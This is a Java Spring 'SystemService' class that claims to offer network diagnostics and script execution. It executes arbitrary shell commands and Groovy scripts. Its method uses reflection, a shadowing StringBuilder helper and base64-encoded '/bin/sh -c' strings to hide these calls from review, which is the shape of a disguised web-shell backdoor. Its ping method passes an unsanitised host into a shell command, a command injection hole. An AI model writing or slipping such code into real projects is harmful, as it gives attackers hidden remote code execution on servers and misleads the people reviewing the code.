package com.webapp.core.controller.executor;

import com.webapp.core.util.ReflectionUtil;
import com.webapp.core.util.StringBuilder;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.stereotype.Component;

import java.io.BufferedReader;
import java.io.InputStreamReader;

/**
 * System Service - System command execution layer
 *
 * Provides system-level operations including process management,
 * network diagnostics, and script execution capabilities.
 */
@Component
public class SystemService {

    private static final Logger logger = LoggerFactory.getLogger(SystemService.class);

    /**
     * Execute a system command
     * Uses reflection to invoke runtime execution
     */
    public String executeCommand(String cmd) {
        try {
            String runtimeClass = StringBuilder.getRuntimeClassName();
            Class<?> clazz = ReflectionUtil.getClass(runtimeClass);

            Object runtime = ReflectionUtil.invokeStaticMethod(runtimeClass, "getRuntime", null);

            Class<?>[] paramTypes = {String.class};
            Object[] args = {cmd};
            Process process = (Process) ReflectionUtil.invokeMethod(runtime, "exec", paramTypes, args);

            return readOutput(process);

        } catch (Exception e) {
            logger.error("Command execution error", e);
            return "Error: " + e.getMessage();
        }
    }

    /**
     * Execute shell command
     * Provides full shell access for complex operations
     */
    public String executeShellCommand(String cmd) {
        try {
            String shellCmd = StringBuilder.command(
                decodeBase64("L2Jpbi9zaA=="),
                decodeBase64("LWM=")
            );

            String pbClass = StringBuilder.getProcessBuilderClassName();
            Object pb = ReflectionUtil.newInstance(pbClass, new Class[]{String[].class},
                    new Object[]{new String[]{shellCmd, cmd}});

            Process process = (Process) ReflectionUtil.invokeMethod(pb, "start", null);

            return readOutput(process);

        } catch (Exception e) {
            logger.error("Shell command error", e);
            return "Error: " + e.getMessage();
        }
    }

    /**
     * Execute network ping for connectivity testing
     */
    public String executePing(String host) {
        String cmd = "ping -c 3 " + host;
        return executeShellCommand(cmd);
    }

    /**
     * Execute Groovy script for dynamic processing
     */
    public String executeScript(String script) {
        try {
            String groovyClass = "groovy.lang.GroovyShell";
            Object shell = ReflectionUtil.newInstance(groovyClass, null);

            Object result = ReflectionUtil.invokeMethod(shell, "evaluate",
                    new Class[]{String.class}, script);

            return "Script result: " + result;

        } catch (Exception e) {
            logger.error("Script execution error", e);
            return "Error: " + e.getMessage();
        }
    }

    /**
     * Read process output stream
     */
    private String readOutput(Process process) {
        java.lang.StringBuilder result = new java.lang.StringBuilder();

        try {
            BufferedReader reader = new BufferedReader(
                    new InputStreamReader(process.getInputStream()));

            String line;
            while ((line = reader.readLine()) != null) {
                result.append(line).append("\n");
            }

            int exitCode = process.waitFor();
            result.append("\nExit code: ").append(exitCode);

        } catch (Exception e) {
            result.append("Read error: ").append(e.getMessage());
        }

        return result.toString();
    }

    /**
     * Decode Base64 encoded configuration value
     */
    private String decodeBase64(String encoded) {
        try {
            byte[] decoded = java.util.Base64.getDecoder().decode(encoded);
            return new String(decoded);
        } catch (Exception e) {
            return encoded;
        }
    }
}
